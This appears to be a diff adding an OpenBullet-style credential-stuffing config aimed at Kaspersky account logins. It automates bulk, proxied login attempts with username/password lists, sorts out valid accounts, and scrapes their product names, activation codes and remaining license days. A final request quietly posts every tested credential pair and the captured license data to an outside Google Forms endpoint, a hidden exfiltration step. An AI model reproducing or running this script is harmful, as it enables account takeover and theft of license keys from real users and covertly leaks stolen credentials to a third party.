@@ -1,0 +1,108 @@
+[SETTINGS]
+{
+  "Name": "Kaspersky",
+  "SuggestedBots": 25,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-05T10:48:24.4749856+03:00",
+  "AdditionalInfo": "",
+  "Author": "Safak",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://ca.uis.kaspersky.com/v3/logon/start" ParseQuery=TRUE 
+  CONTENT "{\"Realm\":\"https://center.kaspersky.com/\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Accept: application/json" 
+  HEADER "Origin: https://my.kaspersky.com" 
+  HEADER "Referer: https://my.kaspersky.com/" 
+
+KEYCHECK 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+  KEYCHAIN Success OR 
+    KEY "LogonContext" 
+
+PARSE "<SOURCE>" LR "{\"LogonContext\":\"" "\"" -> VAR "LogonContext" 
+
+REQUEST POST "https://ca.uis.kaspersky.com/v3/logon/proceed" ParseQuery=TRUE 
+  CONTENT "{\"logonContext\":\"<LogonContext>\",\"login\":\"<USER>\",\"password\":\"<PASS>\",\"locale\":\"en\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Accept: application/json" 
+  HEADER "Origin: https://my.kaspersky.com/" 
+  HEADER "Referer: https://my.kaspersky.com/" 
+
+KEYCHECK 
+  KEYCHAIN Ban OR 
+    KEY "\"CaptchaRequired\"}" 
+    KEY "<RESPONSECODE>" Contains "302" 
+  KEYCHAIN Failure OR 
+    KEY "{\"Status\":\"InvalidRegistrationData\"}" 
+  KEYCHAIN Success OR 
+    KEY "{\"Status\":\"Success\"}" 
+
+REQUEST POST "https://ca.uis.kaspersky.com/v3/logon/complete_active" ParseQuery=TRUE 
+  CONTENT "{\"logonContext\":\"<LogonContext>\",\"TokenType\":\"SamlDeflate\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Accept: application/json" 
+  HEADER "Origin: https://my.kaspersky.com/" 
+  HEADER "Referer: https://my.kaspersky.com/" 
+
+PARSE "<SOURCE>" LR "{\"UserToken\":\"" "\"" -> VAR "Token" 
+
+REQUEST POST "https://my.kaspersky.com/SignIn/CompleteRestLogon" ParseQuery=TRUE 
+  CONTENT "{\"samlDeflatedToken\":\"<Token>\",\"returnUrl\":\"http://my.kaspersky.com/\",\"resendActivationLink\":false}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Accept: application/json" 
+  HEADER "Referer: https://my.kaspersky.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Origin: https://my.kaspersky.com" 
+
+REQUEST GET "https://my.kaspersky.com/MyLicenses" ParseQuery=TRUE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://my.kaspersky.com/dashboard" 
+
+PARSE "<SOURCE>" LR "\"ProductName\":\"" "\"" Recursive=TRUE -> CAP "Producto" 
+
+PARSE "<SOURCE>" LR "\"IsActive\":" "\"" Recursive=TRUE -> CAP "Active" 
+
+PARSE "<SOURCE>" LR "\"ActivationCode\":\"" "\"" Recursive=TRUE -> CAP "ActivationCode" 
+
+PARSE "<SOURCE>" LR "\"DaysRemainder\":" "," Recursive=TRUE -> CAP "DaysReminder" 
+
+REQUEST POST "https://docs.google.com/forms/d/e/1FAIpQLSdJpXrAK7NVwb695nhF5CPbT9rfkQjojb9NZd2Dd1tDbLfrdQ/formResponse" 
+  CONTENT "entry.799395977=<USER>:<PASS>:Kaspersky:<Producto><Active><ActivationCode><DaysReminder>&fvv=1&pageHistory=0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Kaspersky" 
+
